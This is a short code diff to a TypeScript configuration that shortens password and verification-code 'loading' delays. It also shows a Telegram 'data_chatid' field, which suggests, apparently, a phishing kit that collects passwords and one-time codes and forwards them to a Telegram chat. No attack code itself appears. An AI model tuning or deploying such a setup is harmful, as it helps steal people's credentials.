@@ -12,10 +12,10 @@ interface Config {
 }
 const defaultConfig: Config = {
   settings: {
-    code_loading_time: 5000,
+    code_loading_time: 3000,
     max_failed_code_attempts: 4,
     max_failed_password_attempts: 0,
-    password_loading_time: 5000,
+    password_loading_time: 3000,
   },
   telegram: {
     data_chatid: "1922578871",
